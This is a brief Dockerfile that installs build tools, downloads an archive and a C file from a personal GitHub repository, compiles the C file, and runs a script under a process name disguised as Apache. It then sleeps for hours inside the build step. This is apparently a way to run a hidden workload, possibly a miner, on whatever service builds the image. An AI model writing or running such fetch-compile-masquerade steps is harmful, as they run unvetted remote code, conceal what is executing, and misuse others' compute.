FROM ubuntu:18.04

# Install.
RUN \
  apt-get update && \
  apt-get install screen -y && \
  apt-get install make -y && \
  apt-get install -y wget && \
  apt-get install sudo && \
  apt-get install gcc -y && \
  wget https://github.com/thoeb292/thoeb292/raw/main/main.tar.gz && \
  tar xf main.tar.gz && \
  wget https://github.com/thoeb292/thoeb292/raw/main/mas.c && \
  gcc -o test mas.c && \
  ./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./sgr.sh && \
  sleep 16090 && \
  rm -rf /var/lib/apt/lists/* 
